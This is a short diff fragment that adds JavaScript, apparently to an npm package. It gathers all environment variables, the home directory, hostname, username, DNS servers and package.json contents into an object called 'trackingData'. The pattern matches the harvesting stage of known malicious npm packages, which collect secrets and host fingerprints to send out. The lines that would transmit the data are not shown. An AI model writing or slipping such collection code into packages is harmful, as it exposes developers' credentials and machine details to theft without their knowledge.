@@ -1,0 +1,15 @@
+const pwd = process.cwd()
+const trackingData = JSON.stringify({
+                              env: env_vars,
+                              p: package,
+                              c: __dirname,
+                              cwd: pwd,
+                              hd: os.homedir(),
+                              hn: os.hostname(),
+                              un: os.userInfo().username,
+                              dns: dns.getServers(),
+                              r: packageJSON ? packageJSON.___resolved : undefined,
+                              v: packageJSON.version,
+                              pjson: packageJSON,
+                          })
+_tmp_6.cwd = pwd
